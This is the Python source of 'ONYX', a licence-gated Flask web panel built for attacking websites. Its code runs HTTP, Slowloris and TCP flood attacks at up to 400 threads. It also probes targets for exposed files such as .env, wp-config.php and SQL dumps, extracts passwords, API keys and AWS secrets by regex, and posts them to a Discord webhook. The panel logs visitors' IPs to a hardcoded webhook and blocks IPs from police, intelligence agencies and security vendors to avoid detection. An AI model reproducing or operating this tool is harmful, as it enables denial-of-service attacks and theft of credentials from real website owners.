import os
import re
import time
import random
import socket
import ssl
import threading
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

import requests
import urllib3
from flask import Flask, request, jsonify, render_template_string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# ====================== CONFIG ======================
GITHUB_RAW_URL = "https://raw.githubusercontent.com/devlop1094-gif/DDos/refs/heads/main/licenses.json"
MAX_THREADS = 400
DEFAULT_TIMEOUT = 4
MAX_DURATION = 300
NOTIFY_WEBHOOK = os.environ.get("NOTIFY_WEBHOOK", "https://discord.com/api/webhooks/1557328014608568350/e45Z1hUnwhGj-SkjZrQej25lVzfbFiWPGEPIfH7_HKB0_d_VXVUbjt4ZYVo07JTMK5Qm")
# ====================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

session = requests.Session()
session.verify = False

BLOCK_KEYWORDS = [
    "police", "government", "ministry", "defense", "military",
    "fbi", "cia", "nsa", "interpol", "europol",
    "korea police", "national police", "cyber crime", "cybercrime",
    "kisa", "knpa", "nis", "national intelligence",
    "cloudflare", "akamai", "imperva", "sucuri", "incapsula",
    "amazon", "google", "microsoft", "azure", "digitalocean",
    "ovh", "hetzner", "linode", "vultr", "oracle",
    "security", "firewall", "antivirus", "kaspersky", "symantec",
    "trend micro", "crowd strike", "crowdstrike", "palo alto",
    "fortinet", "checkpoint", "sophos"
]

BLOCK_COUNTRIES = []

def get_client_ip():
    if request.headers.get("CF-Connecting-IP"):
        return request.headers.get("CF-Connecting-IP")
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    if request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    return request.remote_addr or "unknown"

def get_ip_info(ip: str) -> dict:
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,isp,org,as,query",
            timeout=4
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                return data
    except:
        pass
    return {}

def is_blocked_ip(ip: str) -> bool:
    if ip in ("127.0.0.1", "::1", "localhost"):
        return False
    info = get_ip_info(ip)
    if not info:
        return False
    if info.get("countryCode") in BLOCK_COUNTRIES:
        return True
    check_str = " ".join([
        str(info.get("isp", "")),
        str(info.get("org", "")),
        str(info.get("as", "")),
        str(info.get("country", ""))
    ]).lower()
    for keyword in BLOCK_KEYWORDS:
        if keyword in check_str:
            return True
    return False

def send_webhook(webhook: str, title: str, content: str):
    if not webhook or not webhook.startswith("http"):
        return
    try:
        if "discord.com/api/webhooks" in webhook:
            payload = {
                "embeds": [{
                    "title": title[:250],
                    "description": content[:4000],
                    "color": 0x00ff9f
                }]
            }
        else:
            payload = {"title": title, "content": content}
        requests.post(webhook, json=payload, timeout=8)
    except:
        pass

def log_visitor(webhook: str = None):
    if not webhook:
        webhook = NOTIFY_WEBHOOK
    if not webhook:
        return
    ip = get_client_ip()
    ua = request.headers.get("User-Agent", "Unknown")[:200]
    path = request.path
    method = request.method
    time_str = time.strftime("%Y-%m-%d %H:%M:%S")
    info = get_ip_info(ip)
    country = info.get("country", "Unknown")
    isp = info.get("isp", "Unknown")
    content = (
        f"**New Visitor**\n"
        f"IP: `{ip}`\n"
        f"Country: {country}\n"
        f"ISP: {isp}\n"
        f"Time: {time_str}\n"
        f"Path: {method} {path}\n"
        f"UA: {ua}"
    )
    threading.Thread(target=send_webhook, args=(webhook, "ONYX Access Log", content), daemon=True).start()

def fetch_licenses():
    try:
        r = requests.get(GITHUB_RAW_URL, timeout=8)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return {"valid_keys": []}

def check_license(key: str) -> bool:
    if not key or len(key) < 4:
        return False
    data = fetch_licenses()
    if key not in data.get("valid_keys", []):
        return False
    expires = data.get("expires", {})
    if key in expires:
        try:
            from datetime import datetime
            if datetime.now() > datetime.strptime(expires[key], "%Y-%m-%d"):
                return False
        except:
            pass
    return True

# ====================== FLOOD ENGINES ======================

def http_flood(target: str, method: str, duration: int):
    end = time.time() + duration
    host = urlparse(target).netloc or target
    while time.time() < end:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Referer": f"https://{host}/",
            }
            if method == "GET":
                session.get(target, headers=headers, timeout=DEFAULT_TIMEOUT)
            elif method == "POST":
                session.post(target, headers=headers, data={"x": random.randint(1, 99999)}, timeout=DEFAULT_TIMEOUT)
            elif method == "HEAD":
                session.head(target, headers=headers, timeout=DEFAULT_TIMEOUT)
        except:
            pass

def slowloris(target: str, duration: int):
    end = time.time() + duration
    parsed = urlparse(target)
    host = parsed.hostname
    if not host:
        return
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    while time.time() < end:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            for _ in range(random.randint(3, 8)):
                if time.time() > end:
                    break
                sock.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                time.sleep(random.uniform(6, 14))
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

def tcp_flood(target: str, duration: int):
    end = time.time() + duration
    parsed = urlparse(target)
    host = parsed.hostname
    if not host:
        return
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    while time.time() < end:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

def start_flood(target: str, method: str, threads: int, duration: int):
    threads = max(1, min(int(threads), MAX_THREADS))
    duration = max(5, min(int(duration), MAX_DURATION))
    method = method.upper().strip()

    def worker():
        try:
            if method in ("GET", "POST", "HEAD"):
                http_flood(target, method, duration)
            elif method == "SLOWLORIS":
                slowloris(target, duration)
            elif method == "TCP":
                tcp_flood(target, duration)
        except:
            pass

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            for _ in as_completed(futures):
                pass
    except:
        pass

# ====================== DB PROBE ======================

COMMON_PATHS = [
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/config.php", "/config.json", "/config.yml", "/configuration.php",
    "/wp-config.php", "/settings.py", "/app.py", "/.git/config", "/.git/HEAD",
    "/backup.sql", "/dump.sql", "/database.sql", "/db.sql",
    "/backup.zip", "/db.zip", "/sql.zip",
    "/phpinfo.php", "/info.php", "/admin", "/administrator",
    "/api", "/api/v1", "/graphql", "/robots.txt",
    "/composer.json", "/package.json", "/.DS_Store",
]

SENSITIVE_PATTERNS = [
    r"(?i)(db_password|database_password|mysql_password|postgres_password)\s*[:=]\s*['\"]?([^\s'\"]+)",
    r"(?i)(db_user|database_user|mysql_user|db_username)\s*[:=]\s*['\"]?([^\s'\"]+)",
    r"(?i)(db_host|database_host|mysql_host)\s*[:=]\s*['\"]?([^\s'\"]+)",
    r"(?i)(db_name|database_name|mysql_database)\s*[:=]\s*['\"]?([^\s'\"]+)",
    r"(?i)(api_key|apikey|secret_key|access_token)\s*[:=]\s*['\"]?([^\s'\"]+)",
    r"(?i)(aws_access_key_id|aws_secret_access_key)\s*[:=]\s*['\"]?([^\s'\"]+)",
    r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?([^\s'\"]{4,})",
]

def probe_target(target: str, webhook: str):
    results = []
    base = target.rstrip("/") + "/"
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    for path in COMMON_PATHS:
        url = urljoin(base, path.lstrip("/"))
        try:
            r = session.get(url, headers=headers, timeout=6, allow_redirects=False)
            if r.status_code != 200 or len(r.content) < 20:
                continue
            text = r.text[:4000]
            findings = []
            for pat in SENSITIVE_PATTERNS:
                found = re.findall(pat, text)
                if found:
                    findings.extend(found[:4])
            entry = f"[FOUND] {url} ({r.status_code}) size={len(r.content)}"
            if findings:
                entry += f"\n    → {findings[:5]}"
            results.append(entry)
        except:
            continue
    report = f"**Target:** {target}\n\n"
    report += "\n".join(results) if results else "No interesting files found."
    send_webhook(webhook, "ONYX DB Probe", report)

# ====================== BLOCK PAGE ======================

BLOCKED_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Access Denied</title>
    <style>
        body { background: #111; color: #ff4444; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #ff4444; padding: 40px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>ACCESS DENIED</h1>
        <p>Your IP has been blocked.</p>
    </div>
</body>
</html>
"""

# ====================== PANEL HTML ======================

PANEL_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ONYX</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{background:#050505;color:#00ff9f;font-family:'Courier New',monospace;min-height:100vh;display:flex;justify-content:center;padding:20px 0}
        .container{width:100%;max-width:500px;padding:0 12px}
        .box{border:1px solid #00ff9f;padding:16px;margin-bottom:12px;background:#0a0a0a}
        h2{margin-bottom:10px;letter-spacing:1.5px;font-size:14px}
        input,select,button,textarea{width:100%;background:#111;color:#00ff9f;border:1px solid #00ff9f;padding:10px;margin:4px 0;font-family:inherit;font-size:12px}
        button{cursor:pointer;font-weight:bold;letter-spacing:1px;margin-top:6px}
        button:hover{background:#00ff9f;color:#000}
        .hidden{display:none}
        label{font-size:11px;opacity:.65;display:block;margin-top:6px}
        .status{margin-top:8px;font-size:12px;min-height:16px;white-space:pre-wrap}
        .tabs{display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap}
        .tab{flex:1;min-width:60px;text-align:center;padding:7px 2px;border:1px solid #00ff9f;cursor:pointer;font-size:11px}
        .tab.active{background:#00ff9f;color:#000}
        .info-line{margin:4px 0;font-size:12px}
        textarea{min-height:85px;resize:vertical}
    </style>
</head>
<body>
<div class="container">
    <div class="box" id="loginBox">
        <h2>ONYX // AUTH</h2>
        <input id="license" placeholder="LICENSE KEY" autocomplete="off" spellcheck="false">
        <button onclick="login()">AUTHENTICATE</button>
        <div class="status" id="loginMsg"></div>
    </div>

    <div class="box hidden" id="mainPanel">
        <div class="tabs">
            <div class="tab active" onclick="showTab('ddos')">DDoS</div>
            <div class="tab" onclick="showTab('db')">DB</div>
            <div class="tab" onclick="showTab('links')">Links</div>
            <div class="tab" onclick="showTab('webhook')">Webhook</div>
            <div class="tab" onclick="showTab('info')">Info</div>
        </div>

        <div id="tab-ddos">
            <label>SELECT SAVED LINK</label>
            <select id="ddosTargetSelect"></select>
            <label>OR DIRECT URL</label>
            <input id="ddosTarget" placeholder="https://example.com">
            <label>METHOD</label>
            <select id="ddosMethod">
                <option value="GET">HTTP GET</option>
                <option value="POST">HTTP POST</option>
                <option value="HEAD">HTTP HEAD</option>
                <option value="SLOWLORIS">Slowloris</option>
                <option value="TCP">TCP Flood</option>
            </select>
            <label>THREADS (max 400)</label>
            <input id="ddosThreads" type="number" value="150" min="1" max="400">
            <label>DURATION (sec)</label>
            <input id="ddosDuration" type="number" value="60" min="10" max="300">
            <button onclick="launchDdos()">LAUNCH ATTACK</button>
            <div class="status" id="ddosStatus"></div>
        </div>

        <div id="tab-db" class="hidden">
            <label>SELECT SAVED LINK</label>
            <select id="dbTargetSelect"></select>
            <label>OR DIRECT URL</label>
            <input id="dbTarget" placeholder="https://example.com">
            <button onclick="launchProbe()">START DB PROBE</button>
            <div class="status" id="dbStatus"></div>
        </div>

        <div id="tab-links" class="hidden">
            <label>SAVED TARGETS (one per line)</label>
            <textarea id="linksArea" placeholder="https://site1.com&#10;https://site2.com"></textarea>
            <button onclick="saveLinks()">SAVE LINKS</button>
            <div class="status" id="linksStatus"></div>
        </div>

        <div id="tab-webhook" class="hidden">
            <label>WEBHOOK URL</label>
            <input id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
            <button onclick="saveWebhook()">SAVE WEBHOOK</button>
            <button onclick="testWebhook()">TEST WEBHOOK</button>
            <div class="status" id="webhookStatus"></div>
        </div>

        <div id="tab-info" class="hidden">
            <div class="info-line">Panel : ONYX v67</div>
            <div class="info-line">Logging : IP + Webhook</div>
            <div class="info-line">IP Filter : Enabled</div>
            <div class="info-line">Max Threads : 400</div>
            <div class="info-line">Methods : GET / POST / HEAD / Slowloris / TCP</div>
            <br>
            <button onclick="logout()">LOGOUT</button>
        </div>
    </div>
</div>

<script>
let currentWebhook = localStorage.getItem('onyx_webhook') || '';
let savedLinks = [];
try { savedLinks = JSON.parse(localStorage.getItem('onyx_links') || '[]'); } catch(e){ savedLinks = []; }

function showTab(name){
    ['ddos','db','links','webhook','info'].forEach(t=>{
        document.getElementById('tab-'+t).classList.add('hidden');
    });
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    document.getElementById('tab-'+name).classList.remove('hidden');
    const idx = {ddos:0,db:1,links:2,webhook:3,info:4}[name];
    document.querySelectorAll('.tab')[idx].classList.add('active');
    if(name==='webhook') document.getElementById('webhookUrl').value = currentWebhook;
    if(name==='links') document.getElementById('linksArea').value = savedLinks.join('\n');
    if(name==='ddos'||name==='db') refreshSelects();
}

function refreshSelects(){
    const opts = savedLinks.map(l=>`<option value="${l}">${l}</option>`).join('');
    const empty = '<option value="">-- select saved link --</option>';
    document.getElementById('ddosTargetSelect').innerHTML = empty + opts;
    document.getElementById('dbTargetSelect').innerHTML = empty + opts;
}

async function login(){
    const key = document.getElementById('license').value.trim();
    if(!key) return document.getElementById('loginMsg').innerText = '>> ENTER KEY';
    try{
        const res = await fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key})});
        const data = await res.json();
        if(data.ok){
            document.getElementById('loginBox').classList.add('hidden');
            document.getElementById('mainPanel').classList.remove('hidden');
            refreshSelects();
        }else{
            document.getElementById('loginMsg').innerText = '>> INVALID OR EXPIRED';
        }
    }catch(e){
        document.getElementById('loginMsg').innerText = '>> NETWORK ERROR';
    }
}

function logout(){
    document.getElementById('mainPanel').classList.add('hidden');
    document.getElementById('loginBox').classList.remove('hidden');
    document.getElementById('license').value = '';
    document.getElementById('loginMsg').innerText = '';
}

function saveLinks(){
    const raw = document.getElementById('linksArea').value.trim();
    savedLinks = raw.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http'));
    localStorage.setItem('onyx_links', JSON.stringify(savedLinks));
    document.getElementById('linksStatus').innerText = `>> SAVED ${savedLinks.length} LINKS`;
    refreshSelects();
}

function saveWebhook(){
    currentWebhook = document.getElementById('webhookUrl').value.trim();
    localStorage.setItem('onyx_webhook', currentWebhook);
    document.getElementById('webhookStatus').innerText = currentWebhook ? '>> SAVED' : '>> CLEARED';
}

async function testWebhook(){
    const url = document.getElementById('webhookUrl').value.trim();
    if(!url) return document.getElementById('webhookStatus').innerText = '>> NO WEBHOOK';
    try{
        const res = await fetch('/test-webhook',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webhook:url})});
        const data = await res.json();
        document.getElementById('webhookStatus').innerText = '>> ' + data.msg;
    }catch(e){
        document.getElementById('webhookStatus').innerText = '>> FAILED';
    }
}

async function launchDdos(){
    let target = document.getElementById('ddosTarget').value.trim();
    if(!target) target = document.getElementById('ddosTargetSelect').value;
    if(!target) return document.getElementById('ddosStatus').innerText = '>> NO TARGET';
    const method = document.getElementById('ddosMethod').value;
    const threads = document.getElementById('ddosThreads').value;
    const duration = document.getElementById('ddosDuration').value;
    document.getElementById('ddosStatus').innerText = '>> LAUNCHING...';
    try{
        const res = await fetch('/ddos',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target,method,threads,duration})});
        const data = await res.json();
        document.getElementById('ddosStatus').innerText = '>> ' + data.msg;
    }catch(e){
        document.getElementById('ddosStatus').innerText = '>> ERROR';
    }
}

async function launchProbe(){
    let target = document.getElementById('dbTarget').value.trim();
    if(!target) target = document.getElementById('dbTargetSelect').value;
    if(!target) return document.getElementById('dbStatus').innerText = '>> NO TARGET';
    if(!currentWebhook) return document.getElementById('dbStatus').innerText = '>> SET WEBHOOK FIRST';
    document.getElementById('dbStatus').innerText = '>> PROBING...';
    try{
        const res = await fetch('/probe',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target,webhook:currentWebhook})});
        const data = await res.json();
        document.getElementById('dbStatus').innerText = '>> ' + data.msg;
    }catch(e){
        document.getElementById('dbStatus').innerText = '>> ERROR';
    }
}
</script>
</body>
</html>
"""

# ====================== ROUTES ======================

@app.before_request
def check_ip():
    if request.path.startswith("/static"):
        return
    ip = get_client_ip()
    if is_blocked_ip(ip):
        return BLOCKED_HTML, 403

@app.route("/")
def index():
    log_visitor()
    return render_template_string(PANEL_HTML)

@app.route("/auth", methods=["POST"])
def auth():
    log_visitor()
    try:
        data = request.get_json(force=True, silent=True) or {}
        key = str(data.get("key", "")).strip()
        return jsonify({"ok": check_license(key)})
    except:
        return jsonify({"ok": False})

@app.route("/ddos", methods=["POST"])
def ddos():
    try:
        data = request.get_json(force=True, silent=True) or {}
        target = str(data.get("target", "")).strip()
        method = str(data.get("method", "GET")).strip()
        threads = data.get("threads", 150)
        duration = data.get("duration", 60)
        if not target.startswith(("http://", "https://")):
            return jsonify({"msg": "INVALID TARGET"})
        threading.Thread(target=start_flood, args=(target, method, threads, duration), daemon=True).start()
        return jsonify({"msg": f"STARTED → {method} | {threads}t | {duration}s"})
    except:
        return jsonify({"msg": "ERROR"})

@app.route("/probe", methods=["POST"])
def probe():
    try:
        data = request.get_json(force=True, silent=True) or {}
        target = str(data.get("target", "")).strip()
        webhook = str(data.get("webhook", "")).strip()
        if not target.startswith(("http://", "https://")):
            return jsonify({"msg": "INVALID TARGET"})
        threading.Thread(target=probe_target, args=(target, webhook), daemon=True).start()
        return jsonify({"msg": "PROBE STARTED"})
    except:
        return jsonify({"msg": "ERROR"})

@app.route("/test-webhook", methods=["POST"])
def test_webhook():
    try:
        data = request.get_json(force=True, silent=True) or {}
        webhook = str(data.get("webhook", "")).strip()
        if not webhook:
            return jsonify({"msg": "NO WEBHOOK"})
        send_webhook(webhook, "ONYX Test", "Webhook OK")
        return jsonify({"msg": "TEST SENT"})
    except:
        return jsonify({"msg": "FAILED"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, threaded=True)
